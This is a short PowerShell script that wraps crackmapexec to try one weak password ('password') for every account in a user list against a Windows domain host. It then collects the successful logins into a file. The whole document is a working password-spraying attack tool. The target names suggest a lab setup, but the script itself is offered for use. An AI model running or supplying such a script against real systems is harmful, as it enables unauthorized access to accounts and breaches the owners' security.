<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain="INSECURE.local"
$global:userlist="users.txt"
#

2) run the script 

./brute_cme.ps1

#>

#$global:target=$args[0]

function run-cme {


# password
ForEach ($user in Get-Content $userlist) {
.\crackmapexec.exe $target  -d $domain -u $user -p password 
Get-Content .\cme_brute_password.txt | findstr [+] | sort-object| Get-Unique > cme_brute_password_cracked.txt
}

date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\cme_brute_password_cracked.txt
}

# Run 

#if ($target) { 
run-cme | Tee cme_brute_password.txt
#} else {
#Write-Host "USEAGE: " 
#Write-Host "	./cme-brute.ps1 [IP ADDRESS]" 
#Write-Host "" 
#Write-Host "" 
#}



